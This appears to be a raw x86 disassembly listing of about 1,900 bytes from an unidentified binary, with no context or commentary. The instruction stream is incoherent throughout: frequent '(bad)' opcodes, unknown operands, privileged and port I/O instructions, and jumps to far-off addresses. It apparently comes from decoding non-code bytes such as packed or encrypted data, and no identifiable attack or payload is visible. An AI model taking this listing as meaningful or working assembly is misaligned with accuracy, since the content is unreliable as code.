  418baa:	lods   al,BYTE PTR ds:[esi]
  418bab:	mov    edx,0x19ad888b
  418bb0:	fstp   QWORD PTR [eax+0x24d06cc]
  418bb6:	outs   dx,BYTE PTR ds:[esi]
  418bb7:	jmp    0x418b96
  418bb9:	add    edi,DWORD PTR [ecx-0x655671f1]
  418bbf:	adc    BYTE PTR [ecx+0x40],0x4d
  418bc3:	add    eax,0x759d41e6
  418bc8:	lahf   
  418bc9:	ins    BYTE PTR es:[edi],dx
  418bca:	xchg   edi,eax
  418bcb:	cdq    
  418bcc:	adc    cl,BYTE PTR [esi+0x49]
  418bcf:	pop    DWORD PTR [esi+esi*1-0x78c12d5b]
  418bd6:	mov    ebp,0x86857a3
  418bdb:	inc    edi
  418bdc:	fwait
  418bdd:	and    eax,0xf5902298
  418be2:	pop    ss
  418be3:	dec    ebp
  418be4:	mov    edx,0x7c966da2
  418be9:	sahf   
  418bea:	dec    ecx
  418beb:	xchg   DWORD PTR [edx+ecx*8-0x21],eax
  418bef:	cdq    
  418bf0:	fst    QWORD PTR [eax-0x3ea63b4e]
  418bf6:	add    BYTE PTR [edx+0x58],0x41
  418bfa:	mov    ch,0x2d
  418bfc:	in     eax,dx
  418bfd:	data16 jge 0x418c36
  418c00:	nop
  418c01:	jo     0x418c32
  418c03:	xchg   ecx,eax
  418c04:	fld    QWORD PTR [edi+0x1a4ca9c5]
  418c0a:	push   ebx
  418c0b:	lods   al,BYTE PTR ds:[esi]
  418c0c:	scas   al,BYTE PTR es:[edi]
  418c0d:	inc    eax
  418c0e:	hlt    
  418c0f:	or     eax,0xa294aa9a
  418c14:	jb     0x418c62
  418c16:	xchg   ebx,eax
  418c17:	mov    ds:0x54a058dd,eax
  418c1c:	(bad)
  418c1f:	mov    bh,0xe0
  418c21:	aas    
  418c22:	cmp    ebx,eax
  418c24:	sub    al,0xa7
  418c26:	fdivr  QWORD PTR [ebx-0x6267d13d]
  418c2c:	cmp    ebx,DWORD PTR ss:[ecx+0x4c71ffa1]
  418c33:	call   0x86de82a8
  418c38:	nop
  418c39:	add    WORD PTR [ebx],0xffdd
  418c3d:	in     al,0x11
  418c3f:	ss cli 
  418c41:	sbb    DWORD PTR [eax],ebp
  418c43:	dec    esp
  418c44:	mov    ds:0xd5c69040,eax
  418c49:	popf   
  418c4a:	push   es
  418c4b:	clc    
  418c4c:	sahf   
  418c4d:	popa   
  418c4e:	xchg   edi,eax
  418c4f:	or     eax,0x6546d31e
  418c54:	mov    edi,0x42f37cbd
  418c59:	aam    0x23
  418c5b:	xchg   edi,edx
  418c5d:	mov    eax,ds:0xd8dd245a
  418c62:	(bad)  
  418c63:	out    0xb8,al
  418c65:	in     al,dx
  418c66:	sahf   
  418c67:	inc    esi
  418c68:	mov    cl,0x40
  418c6a:	dec    esp
  418c6b:	sbb    al,0xf0
  418c6d:	addr16 jbe 0x418c66
  418c70:	xchg   esp,eax
  418c71:	scas   al,BYTE PTR es:[edi]
  418c72:	xchg   edi,eax
  418c73:	xor    eax,0x481972ab
  418c78:	cmp    eax,0x3fe9acd7
  418c7d:	shl    eax,cl
  418c7f:	xchg   BYTE PTR [esi-0x224d65b3],ah
  418c85:	xchg   edi,eax
  418c86:	xchg   ebp,eax
  418c87:	add    DWORD PTR [ecx],esp
  418c89:	lock mov ebx,0x88bb56d8
  418c8f:	pop    ds
  418c90:	xor    eax,eax
  418c92:	xchg   esi,eax
  418c93:	mov    BYTE PTR [ebx-0x6a],al
  418c96:	or     esp,DWORD PTR [ecx]
  418c98:	mov    bl,BYTE PTR [esi-0x66]
  418c9b:	dec    edx
  418c9c:	les    ebx,FWORD PTR [eax]
  418c9e:	clc    
  418c9f:	cmp    eax,0x8797f78e
  418ca4:	mov    ebx,0x7dac372
  418ca9:	bnd jge 0x418c34
  418cac:	(bad)  
  418cad:	add    eax,0xe216d35c
  418cb2:	mov    dh,0x56
  418cb4:	jge    0x418c81
  418cb6:	jbe    0x418cab
  418cb8:	loope  0x418d18
  418cba:	xor    edi,esi
  418cbc:	sahf   
  418cbd:	xchg   edi,eax
  418cbe:	jle    0x418d2a
  418cc0:	lds    edi,FWORD PTR [esi+0x1378c804]
  418cc6:	mov    ds:0xa5e917de,eax
  418ccb:	push   es
  418ccc:	cmp    eax,0x7c1472dd
  418cd1:	enter  0x6327,0xe2
  418cd5:	stos   DWORD PTR es:[edi],eax
  418cd6:	xchg   edx,eax
  418cd7:	jl     0x418d13
  418cd9:	call   DWORD PTR [edi+0x1e]
  418cdc:	xor    al,ch
  418cde:	loop   0x418d1e
  418ce0:	mov    al,ds:0x34fb704e
  418ce5:	mov    al,ds:0x516f8877
  418cea:	fldenv [ecx+0x6cb8d925]
  418cf0:	lock jmp 0x798b1396
  418cf6:	iret   
  418cf7:	aaa    
  418cf8:	mov    esp,0xb58711aa
  418cfd:	jo     0x418d59
  418cff:	lahf   
  418d00:	fnsave [esi+ecx*1-0x102ed9a8]
  418d07:	mov    gs,edx
  418d09:	arpl   WORD PTR [ecx],cx
  418d0b:	mov    ecx,0xda60472e
  418d10:	xchg   esp,eax
  418d11:	adc    BYTE PTR [ebx-0xc65791e],bh
  418d17:	(bad)  
  418d18:	add    BYTE PTR [ebx-0x9],al
  418d1b:	dec    eax
  418d1c:	sbb    BYTE PTR [edx*2-0x385d910f],dl
  418d23:	aaa    
  418d24:	jnp    0x418d74
  418d26:	imul   ebp,ebp,0xd3574d5b
  418d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d2d:	mov    al,0x13
  418d2f:	push   edx
  418d30:	loopne 0x418cde
  418d32:	shl    BYTE PTR [edx+0x46],1
  418d35:	mov    bh,0xd4
  418d37:	mov    al,ds:0x6ed76419
  418d3c:	cli    
  418d3d:	inc    edx
  418d3e:	in     al,dx
  418d3f:	jl     0x418cee
  418d41:	sbb    BYTE PTR [ecx+0x48],ch
  418d44:	jns    0x418d47
  418d46:	lock jge 0x418db7
  418d49:	xor    BYTE PTR [eax-0x68682499],dh
  418d4f:	jle    0x418d1f
  418d51:	adc    al,BYTE PTR gs:[esi-0x1a]
  418d55:	(bad)  
  418d56:	scas   al,BYTE PTR es:[edi]
  418d57:	aam    0xf6
  418d59:	outs   dx,DWORD PTR ds:[esi]
  418d5a:	xchg   edi,eax
  418d5b:	mov    edi,0x59101717
  418d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d61:	adc    DWORD PTR [eax+0x407907d],ebx
  418d67:	imul   edi,DWORD PTR [ebp+0x615b0e6f],0xffffffb0
  418d6e:	add    BYTE PTR [esi-0x38f9c949],ah
  418d74:	inc    ebp
  418d75:	adc    BYTE PTR [eax-0x422ceca7],bl
  418d7b:	xchg   esi,eax
  418d7c:	dec    edx
  418d7d:	mov    ah,ah
  418d7f:	in     al,0x55
  418d81:	add    eax,0x23f489a5
  418d86:	pop    ecx
  418d87:	inc    edx
  418d88:	push   ecx
  418d89:	jo     0x418d35
  418d8b:	add    BYTE PTR [esi+0x32],dl
  418d8e:	call   0xf7e00159
  418d93:	loop   0x418db2
  418d95:	sbb    esp,DWORD PTR [edx+0x752ff5fb]
  418d9b:	loop   0x418dc7
  418d9d:	es pop edx
  418d9f:	jae    0x418da3
  418da1:	inc    eax
  418da2:	push   ecx
  418da3:	add    eax,0x43f08e0e
  418da8:	mov    fs,ecx
  418daa:	xchg   edi,eax
  418dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dac:	and    al,0x81
  418dae:	mov    ds,WORD PTR [edx-0x67439d8b]
  418db4:	sbb    al,0xb6
  418db6:	dec    ebx
  418db7:	sub    ecx,0xb78775bc
  418dbd:	cwde   
  418dbe:	loope  0x418de9
  418dc0:	fst    QWORD PTR [ecx-0x14]
  418dc3:	lock sbb dh,al
  418dc6:	pop    edi
  418dc7:	fsub   DWORD PTR [edi+0x819d742]
  418dcd:	jmp    0x4fff3e3f
  418dd2:	push   ss
  418dd3:	xchg   ebp,eax
  418dd4:	in     al,0x31
  418dd6:	adc    al,0xe7
  418dd8:	push   ebx
  418dd9:	xchg   edx,eax
  418dda:	out    0xac,eax
  418ddc:	cdq    
  418ddd:	inc    esp
  418dde:	adc    eax,0xdd35a4d6
  418de3:	mov    esi,esp
  418de5:	dec    ebx
  418de6:	push   edx
  418de7:	mov    ch,BYTE PTR [ebp-0x249ae83f]
  418ded:	hlt    
  418dee:	xchg   edi,eax
  418def:	imul   esi,ebx,0x7f
  418df2:	fld    QWORD PTR [ecx]
  418df4:	and    eax,0xeeedaaa8
  418df9:	dec    ebp
  418dfa:	dec    esi
  418dfb:	xchg   DWORD PTR [edx],edi
  418dfd:	inc    esp
  418dfe:	mov    ch,0xa
  418e00:	frstor [edx]
  418e02:	in     al,dx
  418e03:	iret   
  418e04:	cmp    DWORD PTR [edi-0x32],esp
  418e07:	cwde   
  418e08:	inc    edi
  418e09:	inc    eax
  418e0a:	mov    DWORD PTR [eax-0x79],0xc5109862
  418e11:	mov    esi,0x19fd1797
  418e16:	int    0x24
  418e18:	inc    ebp
  418e19:	dec    esi
  418e1a:	mov    ?,WORD PTR [ebx]
  418e1c:	cwde   
  418e1d:	cmc    
  418e1e:	adc    al,BYTE PTR [edi-0x15097df7]
  418e24:	loopne 0x418e3b
  418e26:	test   DWORD PTR [ebp+0x7b],ebp
  418e29:	aam    0x40
  418e2b:	test   eax,eax
  418e2d:	mov    BYTE PTR [ecx-0x78133b7b],dh
  418e33:	push   ss
  418e34:	rol    ebp,0x72
  418e37:	jecxz  0x418e92
  418e39:	mov    ecx,0xccaf874b
  418e3e:	adc    dl,BYTE PTR [esi-0x18]
  418e41:	add    ecx,DWORD PTR [edi+0x13439ef6]
  418e47:	test   DWORD PTR [esi+0x20],edi
  418e4a:	stc    
  418e4b:	cmp    eax,0x369e4014
  418e50:	fdivrp st(4),st
  418e52:	xor    BYTE PTR [ecx+0x399ad302],bl
  418e58:	xchg   esi,eax
  418e59:	jmp    0x418ea8
  418e5b:	pop    esi
  418e5c:	mov    cl,0xc1
  418e5e:	jno    0x418e4f
  418e60:	leave  
  418e61:	sbb    eax,DWORD PTR [eax+0x156ed066]
  418e67:	xchg   DWORD PTR [edi-0x3f],eax
  418e6a:	int3   
  418e6b:	ret    
  418e6c:	hlt    
  418e6d:	jno    0x418dfa
  418e6f:	add    ebx,ebp
  418e71:	ss repz out dx,eax
  418e74:	scas   al,BYTE PTR es:[edi]
  418e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e76:	cwde   
  418e77:	or     al,0x2c
  418e79:	int3   
  418e7a:	pop    ds
  418e7b:	mov    BYTE PTR [esi],dl
  418e7d:	repnz in al,dx
  418e7f:	push   ss
  418e80:	and    DWORD PTR [ecx-0x75],esp
  418e83:	test   DWORD PTR [ecx],0xddc65517
  418e89:	cmc    
  418e8a:	add    BYTE PTR [ebx-0x1e],dl
  418e8d:	ss ror edi,cl
  418e90:	add    dh,BYTE PTR [ebp+0x1e]
  418e93:	sar    DWORD PTR ds:0x7eee8ab4,0x63
  418e9a:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e9c:	cli    
  418e9d:	cs jbe 0x418e35
  418ea0:	fs aaa 
  418ea2:	shl    ebp,0xcd
  418ea5:	cmc    
  418ea6:	jmp    0x418ebd
  418ea8:	out    0x2f,al
  418eaa:	cld    
  418eab:	sbb    ebp,eax
  418ead:	leave  
  418eae:	pop    edx
  418eaf:	xchg   DWORD PTR [ebx],edi
  418eb1:	adc    edi,DWORD PTR [ecx-0x378e2284]
  418eb7:	and    eax,0x76bb3c4f
  418ebc:	jno    0x418ef4
  418ebe:	sti    
  418ebf:	add    BYTE PTR [eax],bl
  418ec1:	pop    ds
  418ec2:	push   edx
  418ec3:	nop
  418ec4:	frstor [edx-0x3e]
  418ec7:	add    eax,0x8099316f
  418ecc:	mov    cl,0x23
  418ecf:	inc    esi
  418ed0:	hlt    
  418ed1:	push   esp
  418ed2:	addr16 xor eax,0x5ca85ca9
  418ed8:	pop    ebp
  418ed9:	and    BYTE PTR [esi+0x63],0x96
  418edd:	sar    DWORD PTR es:[ecx],cl
  418ee0:	frstor [ebx]
  418ee2:	fnstsw WORD PTR [ebp+esi*2+0x72ab8d3]
  418ee9:	pop    esp
  418eea:	jb     0x418f0a
  418eec:	mov    cl,0x0
  418eee:	out    dx,eax
  418eef:	movntq QWORD PTR [edi+0x4a],mm6
  418ef3:	cmp    ebp,ebx
  418ef5:	xor    eax,0x3feb856b
  418efa:	mov    al,0x99
  418efc:	shr    ch,cl
  418efe:	push   ecx
  418eff:	adc    al,0x19
  418f01:	jge    0x418f45
  418f03:	xchg   DWORD PTR [edx],ebp
  418f05:	fsub   DWORD PTR [edx+0x7b]
  418f08:	stc    
  418f09:	xor    eax,0x7f1d8090
  418f0e:	mov    dl,0x79
  418f10:	mov    ecx,?
  418f12:	jp     0x418ebe
  418f14:	mov    ds:0xfa8719e7,al
  418f19:	ret    
  418f1a:	dec    ebx
  418f1b:	or     eax,0x75b87ce4
  418f20:	cmp    DWORD PTR [esi-0xd4f00a9],ecx
  418f26:	(bad)  
  418f27:	xchg   edx,eax
  418f28:	xor    ecx,DWORD PTR [ebp+0x523286bf]
  418f2e:	stos   DWORD PTR es:[edi],eax
  418f2f:	icebp  
  418f30:	jne    0x418f7c
  418f32:	mov    bl,0xc5
  418f34:	xchg   esi,eax
  418f35:	jnp    0x418f6a
  418f37:	mov    eax,0x533891d
  418f3c:	cmp    BYTE PTR [ebx],ch
  418f3e:	in     al,dx
  418f3f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  418f41:	sahf   
  418f42:	ss xchg ebp,eax
  418f44:	mov    ebp,0x4f73c062
  418f49:	jns    0x418ee9
  418f4b:	pop    esp
  418f4c:	test   DWORD PTR [ebp-0x3321f08],edx
  418f52:	xchg   ebp,eax
  418f53:	push   eax
  418f54:	je     0x418f96
  418f56:	pop    esp
  418f57:	pop    ebx
  418f58:	imul   esp,DWORD PTR [ebx],0xd9acae0e
  418f5e:	mov    ds:0xccd8358d,al
  418f63:	mov    al,ds:0x6f67ea7
  418f68:	mov    dh,0xd0
  418f6a:	sbb    al,0x18
  418f6c:	fadd   DWORD PTR [ebx+0x5c]
  418f6f:	add    bh,BYTE PTR [ebx+0x6529c314]
  418f75:	dec    esp
  418f76:	fcom   QWORD PTR [eax-0x6]
  418f79:	lock sbb al,0xa4
  418f7c:	fnsave [edx+eax*4+0x75430a75]
  418f83:	cmp    ebx,0x23
  418f86:	xchg   ecx,eax
  418f87:	xchg   DWORD PTR [ebp+0x7e],esi
  418f8a:	imul   eax,DWORD PTR [edi],0xe68985dd
  418f90:	fwait
  418f91:	mov    esi,0x406e407d
  418f96:	jbe    0x418f71
  418f98:	push   es
  418f99:	popa   
  418f9a:	pop    edx
  418f9b:	pushf  
  418f9c:	pop    ebp
  418f9d:	adc    DWORD PTR [edi-0x64a1ad46],0x16
  418fa4:	dec    esi
  418fa5:	ret    
  418fa6:	fsub   st,st(1)
  418fa8:	cmp    eax,0x6e013541
  418fad:	dec    esp
  418fae:	mov    ebx,0x16202bb4
  418fb3:	(bad)  
  418fb4:	mov    esi,0x1b5a500f
  418fb9:	(bad)  
  418fba:	xchg   edi,eax
  418fbb:	xchg   ebx,eax
  418fbc:	es daa 
  418fbe:	test   al,0x3e
  418fc0:	jl     0x418ffc
  418fc2:	jb     0x41903e
  418fc4:	push   edx
  418fc5:	jl     0x418f68
  418fc7:	xchg   BYTE PTR ds:0x4ed731fd,al
  418fcd:	scas   eax,DWORD PTR es:[edi]
  418fce:	xchg   edi,eax
  418fcf:	in     al,0xd2
  418fd1:	jae    0x418fd2
  418fd3:	jle    0x418fc5
  418fd5:	aam    0xc
  418fd7:	sbb    DWORD PTR [eax+0x258c10be],edx
  418fdd:	add    BYTE PTR [edi+0x1e],bh
  418fe0:	in     eax,dx
  418fe1:	mov    dl,0x97
  418fe3:	mov    DWORD PTR [ecx+0x23],esi
  418fe6:	jbe    0x41902b
  418fe8:	dec    esp
  418fe9:	xchg   edi,eax
  418fea:	clc    
  418feb:	xchg   edi,eax
  418fec:	imul   edi,esi,0xd8638738
  418ff2:	jmp    0x8a766d98
  418ff7:	or     DWORD PTR [ecx-0x681b41ed],ecx
  418ffd:	inc    eax
  418ffe:	mov    dh,0x29
  419000:	or     BYTE PTR [edx+0x3673ee76],0x80
  419007:	jb     0x418ff4
  419009:	fiadd  DWORD PTR [edi]
  41900b:	or     eax,eax
  41900d:	shl    BYTE PTR [ecx+0x33],0x42
  419011:	sbb    DWORD PTR [ebx+0x28],edx
  419014:	outs   dx,DWORD PTR ds:[esi]
  419015:	or     al,0xa0
  419017:	xchg   DWORD PTR [edi-0x35],esp
  41901a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41901b:	jne    0x418fd7
  41901d:	(bad)  
  41901e:	mov    bl,0x86
  419020:	lea    ecx,[eax+edi*4+0x5c00558b]
  419027:	push   edx
  419028:	push   ss
  419029:	fs das 
  41902b:	push   ss
  41902c:	jle    0x41901e
  41902e:	mov    ?,WORD PTR [eax]
  419030:	jp     0x418ffb
  419032:	xchg   edi,eax
  419033:	test   bl,0x3e
  419036:	pop    ds
  419037:	popa   
  419038:	out    0xf0,eax
  41903a:	pop    ebp
  41903b:	popf   
  41903c:	and    esp,DWORD PTR [esi]
  41903e:	imul   eax,DWORD PTR [edi-0x2a6e347d],0xffffffdd
  419045:	push   esp
  419046:	mov    bl,0x38
  419048:	push   ebp
  419049:	mov    al,0x87
  41904b:	mov    edx,0x798c409b
  419050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419051:	je     0x419088
  419053:	sbb    BYTE PTR [ecx],cl
  419055:	sbb    BYTE PTR [eax-0x3729fcda],bl
  41905b:	icebp  
  41905c:	xchg   al,dh
  41905e:	out    dx,eax
  41905f:	or     DWORD PTR [eax-0x14],esi
  419062:	mov    ecx,0x985b8286
  419067:	push   ebp
  419068:	in     al,0x43
  41906a:	ja     0x41904c
  41906c:	lahf   
  41906d:	scas   eax,DWORD PTR es:[edi]
  41906e:	push   cs
  41906f:	pop    edx
  419070:	sub    eax,0xe99ea1e4
  419075:	aas    
  419076:	inc    esp
  419077:	add    eax,0x6afaa692
  41907c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41907d:	push   edx
  41907e:	call   0x6e4a:0xa6c33af9
  419085:	clc    
  419086:	int    0xa
  419088:	les    ecx,FWORD PTR [ebx-0x20]
  41908b:	jmp    0x41903b
  41908d:	sub    eax,0xd090771f
  419092:	pop    eax
  419093:	fldcw  WORD PTR [eax-0x50e36882]
  419099:	sar    DWORD PTR [ebp+0x7b],1
  41909c:	fmul   st(1),st
  41909e:	push   ds
  41909f:	rol    DWORD PTR [edx-0x78790955],0x66
  4190a6:	mov    esi,?
  4190a8:	loopne 0x41904b
  4190aa:	pop    eax
  4190ab:	or     eax,0x923f0f3
  4190b0:	ins    BYTE PTR es:[edi],dx
  4190b1:	cld    
  4190b2:	xor    eax,0xe758c57f
  4190b7:	xchg   BYTE PTR [ebx],bl
  4190b9:	rol    dh,0x4
  4190bc:	cmp    ebp,edi
  4190be:	mov    ebp,0x7182567d
  4190c3:	xchg   eax,edx
  4190c5:	arpl   WORD PTR [edi+0x5812271f],sp
  4190cb:	xchg   esi,esi
  4190cd:	ja     0x4190fe
  4190cf:	pop    ss
  4190d0:	loopne 0x41905e
  4190d2:	jmp    0xc36802d7
  4190d7:	(bad)  
  4190d8:	mov    edi,DWORD PTR [edx-0x64]
  4190db:	ss inc ebp
  4190dd:	stos   BYTE PTR es:[edi],al
  4190de:	inc    edi
  4190df:	mov    WORD PTR [eax+eax*1+0x58ce9b33],fs
  4190e6:	xchg   edi,eax
  4190e7:	jne    0x4190e8
  4190e9:	clc    
  4190ea:	pop    ebp
  4190eb:	mov    edx,0xc8a8811a
  4190f0:	jecxz  0x4190a8
  4190f2:	jae    0x41907b
  4190f4:	sbb    BYTE PTR [esi],dl
  4190f6:	icebp  
  4190f7:	and    al,0x57
  4190f9:	xchg   esp,eax
  4190fa:	mov    dh,0x40
  4190fc:	sbb    eax,0xa996d81f
  419101:	fnstenv [ebx-0x21be92d7]
  419107:	mov    edx,0x1ad42301
  41910c:	and    DWORD PTR [eax+0x5ee27e57],esp
  419112:	cmp    BYTE PTR [eax-0x46],bl
  419115:	inc    ecx
  419116:	xchg   edi,eax
  419117:	sub    eax,ebx
  419119:	xchg   ebx,eax
  41911a:	popf   
  41911b:	push   es
  41911c:	call   0x7323d260
  419121:	cwde   
  419122:	jne    0x4190a5
  419124:	cmp    dl,BYTE PTR [edi+edx*4-0x43]
  419128:	jmp    0xfc02fa1f
  41912d:	and    BYTE PTR [edi],0xce
  419130:	jmp    0x4190f7
  419132:	std    
  419133:	xchg   BYTE PTR [ebp-0x51],dh
  419136:	loop   0x4190bd
  419138:	(bad)  [edx-0x28712a73]
  41913e:	xor    al,bl
  419140:	jb     0x419182
  419142:	cmp    BYTE PTR [edi+0x40],0xc4
  419146:	stos   BYTE PTR es:[edi],al
  419147:	rcr    DWORD PTR [edx-0x1f9867e3],cl
  41914d:	ins    DWORD PTR es:[edi],dx
  41914e:	pop    esi
  41914f:	jno    0x419138
  419151:	mul    BYTE PTR [ecx]
  419153:	or     al,bl
  419155:	xor    eax,DWORD PTR gs:[edi-0x4523d84b]
  41915c:	fld    QWORD PTR [esi+ecx*4]
  41915f:	lea    edi,[edx-0x5c]
  419162:	xchg   esi,eax
  419163:	cli    
  419164:	int    0x43
  419166:	imul   esi,ebp,0x4b6dd05a
  41916c:	(bad)  
  41916d:	neg    DWORD PTR ds:0x788ddd9b
  419173:	xchg   ebp,eax
  419174:	jb     0x419122
  419176:	popa   
  419177:	xchg   ebx,eax
  419178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419179:	inc    eax
  41917a:	push   ebx
  41917b:	sar    BYTE PTR [ecx+ecx*2-0x7497d58],1
  419182:	xchg   edi,eax
  419183:	push   esi
  419184:	push   ds
  419185:	inc    esp
  419186:	push   0x2c
  419188:	into   
  419189:	add    BYTE PTR [edi-0x481c2e19],ah
  41918f:	xchg   al,cl
  419191:	mov    cl,0x59
  419193:	pop    edi
  419194:	fld    QWORD PTR [ebp-0x3f7d0b3b]
  41919a:	jbe    0x41912d
  41919c:	aam    0x5c
  41919e:	in     eax,0x1f
  4191a0:	pop    DWORD PTR [eax-0x60a3497b]
  4191a6:	aam    0xca
  4191a8:	or     esp,DWORD PTR [ebx+0x40185570]
  4191ae:	sbb    BYTE PTR [edx+ecx*1+0x1b0d00ef],ch
  4191b5:	inc    eax
  4191b6:	pop    ebx
  4191b7:	inc    edi
  4191b8:	out    0x46,eax
  4191ba:	comiss xmm6,xmm0
  4191bd:	mov    esi,0xd3d4ed97
  4191c2:	pusha  
  4191c3:	push   edi
  4191c4:	iret   
  4191c5:	enter  0x16f7,0x24
  4191c9:	icebp  
  4191ca:	mov    ch,0x86
  4191cc:	jmp    0x18e0ecc6
  4191d1:	adc    bl,dh
  4191d3:	mov    al,ds:0xdf00fc3
  4191d8:	lods   eax,DWORD PTR ds:[esi]
  4191d9:	pop    esp
  4191da:	fdiv   QWORD PTR ss:[esi-0x163374c0]
  4191e1:	sti    
  4191e2:	sbb    eax,0xa5fa6b1e
  4191e7:	adc    eax,0xbb57b6c5
  4191ec:	retf   
  4191ed:	mov    ch,0x5
  4191ef:	inc    edi
  4191f0:	das    
  4191f1:	inc    eax
  4191f2:	lock clc 
  4191f4:	pop    ebx
  4191f5:	add    al,0x3f
  4191f7:	pop    eax
  4191f8:	int3   
  4191f9:	leave  
  4191fa:	xchg   edi,eax
  4191fb:	inc    ebp
  4191fc:	inc    ebx
  4191fd:	push   eax
  4191fe:	scas   eax,DWORD PTR es:[edi]
  4191ff:	mov    DWORD PTR [edi-0x8],edi
  419202:	dec    ebp
  419203:	pop    ebx
  419204:	popf   
  419205:	xor    eax,0xe8ba9
  41920a:	mov    ch,0x7
  41920c:	cmp    dh,BYTE PTR [edx-0x66]
  41920f:	(bad)  
  419210:	and    eax,0x8181534e
  419215:	fdivr  st,st(1)
  419217:	in     eax,dx
  419218:	add    eax,0x14ed3640
  41921d:	loopne 0x4191ff
  41921f:	push   es
  419220:	add    ch,BYTE PTR [eax+ebx*4]
  419223:	bound  eax,QWORD PTR [ebx]
  419225:	test   BYTE PTR [ebp+0x64],bl
  419228:	ret    0x5791
  41922b:	and    cl,BYTE PTR [eax+0x16]
  41922e:	jo     0x4191b7
  419230:	outs   dx,DWORD PTR ds:[esi]
  419231:	adc    al,0x40
  419233:	ja     0x419285
  419235:	or     DWORD PTR [eax-0x657cd014],ebx
  41923b:	push   esi
  41923c:	aad    0x4d
  41923e:	hlt    
  41923f:	into   
  419240:	sti    
  419241:	pop    eax
  419242:	pop    eax
  419243:	xchg   DWORD PTR [edx+0x65],edx
  419246:	and    eax,0x5505effd
  41924b:	fcmovnu st,st(5)
  41924d:	add    ch,BYTE PTR [edx+ecx*8-0x47]
  419251:	ret    
  419252:	cmp    cl,BYTE PTR [ebx+esi*4+0x7786fdf0]
  419259:	mov    ds:0x84e0b18b,eax
  41925e:	push   ebp
  41925f:	je     0x419248
  419261:	imul   eax,DWORD PTR [esi],0xffffffe1
  419264:	outs   dx,BYTE PTR ds:[esi]
  419265:	test   al,0xdd
  419267:	jbe    0x4192d3
  419269:	jp     0x4192c7
  41926b:	add    bl,BYTE PTR [ebp-0x23]
  41926e:	jo     0x4192b2
  419270:	jmp    FWORD PTR [ebx+0xaddbf90]
  419276:	(bad)  
  419278:	sub    BYTE PTR [edi-0xb],0x89
  41927c:	xchg   edi,eax
  41927d:	mov    al,0xd4
  41927f:	retf   
  419280:	jns    0x41920a
  419282:	dec    ebx
  419283:	xchg   DWORD PTR [edi-0x226611f0],ecx
  419289:	xor    bh,BYTE PTR [ecx-0x24]
  41928c:	pop    ecx
  41928d:	adc    al,0xe7
  41928f:	push   0xf89c436d
  419294:	inc    edx
  419295:	push   0x46
  419297:	fstp   QWORD PTR [ebp-0x48]
  41929b:	(bad)  
  41929c:	push   ss
  41929d:	(bad)  
  41929e:	scas   al,BYTE PTR es:[edi]
  41929f:	sbb    BYTE PTR [eax-0x1f5064b1],ch
  4192a5:	adc    DWORD PTR [edx+ebp*8-0x19],0x3f
  4192aa:	or     al,0xe3
  4192ac:	out    dx,al
  4192ad:	and    al,0xd0
  4192af:	sbb    esi,ebx
  4192b1:	test   DWORD PTR ds:0x828d8bd0,ecx
  4192b7:	pop    edi
  4192b8:	ror    DWORD PTR [edi],1
  4192ba:	(bad)  
  4192bb:	stos   DWORD PTR es:[edi],eax
  4192bc:	dec    ebx
  4192bd:	stc    
  4192be:	lahf   
  4192bf:	cdq    
  4192c0:	add    al,0x4a
  4192c2:	jns    0x41924b
  4192c4:	pop    ss
  4192c5:	push   ds
  4192c6:	mov    DWORD PTR [ebx-0x35],eax
  4192c9:	pusha  
  4192ca:	lock push ebx
  4192cc:	frstor [ecx+0x62fa50b2]
  4192d2:	rcr    DWORD PTR [ecx],0x8e
  4192d5:	inc    eax
  4192d6:	sti    
  4192d7:	add    al,0x85
  4192d9:	xchg   esp,eax
  4192da:	fild   QWORD PTR [edi-0x39]
  4192dd:	push   edi
  4192de:	lods   eax,DWORD PTR ds:[esi]
  4192df:	pop    ebp
  4192e0:	xor    BYTE PTR [ecx-0x5a],bl
  4192e3:	loopne 0x41935f
  4192e5:	loopne 0x419330
  4192e7:	pop    ds
  4192e8:	pop    ss
  4192e9:	test   DWORD PTR [esi-0x55],0x8e71f035
  4192f0:	push   esp
  4192f1:	lock jbe 0x419342
  4192f4:	gs add eax,0xf8e3599f
  4192fa:	ret    0x82db
  4192fd:	test   DWORD PTR [edi+0x31],edx
  419300:	sub    BYTE PTR [esp+eiz*2-0x8],ch
  419304:	xor    DWORD PTR [eax+0x59b88753],ebx
  41930a:	daa    
  41930b:	jae    0x419307
  41930d:	test   eax,0xbe289bf
  419312:	jmp    0x4192d5
  419314:	popf   
  419315:	push   eax
  419316:	cmp    al,0x4d
  419318:	dec    ebp
  419319:	inc    ebx
  41931a:	sar    DWORD PTR [ecx],cl
  41931c:	sti    
  41931d:	push   ebx
  41931e:	sbb    eax,0x4fb7de29
  419323:	pop    edx
  419324:	ins    BYTE PTR es:[edi],dx
  419325:	mov    ?,WORD PTR [esi-0x1c2c5aad]
  41932b:	stos   DWORD PTR es:[edi],eax
  41932c:	and    ah,BYTE PTR [esp+esi*2-0x79]
  419330:	inc    ebp
  419331:	out    dx,eax
  419332:	mov    esi,0x97736d5a
  419337:	rol    DWORD PTR [edi+0x1d27210d],0x61
  41933e:	idiv   BYTE PTR [ebx+ecx*1-0x3a3a6188]
  419345:	mov    WORD PTR [edi+ebx*8+0x2782f91b],gs
  41934c:	fnstsw WORD PTR [eax+edx*1+0x11dbc4e9]
  419353:	pop    ecx
  419354:	int    0x40
  419356:	shl    DWORD PTR [edi],1
  419358:	sbb    DWORD PTR [esi],ebx
  41935a:	mov    DWORD PTR [edx],eax
  41935c:	(bad)  
  41935d:	aas    
  41935e:	cwde   
  41935f:	or     ebp,DWORD PTR [ecx]
  419361:	mov    bh,0x17
  419363:	mov    DWORD PTR [ebx-0x7971704],ebp
  419369:	or     ebx,DWORD PTR [eax+0x7756eac1]
  41936f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419370:	xor    al,0x90
  419372:	xchg   edi,eax
  419373:	icebp  
  419374:	scas   eax,DWORD PTR es:[edi]
  419375:	cmc    
  419376:	icebp  
  419377:	(bad)  
  419378:	and    BYTE PTR [edx+0x27a5e2eb],dh
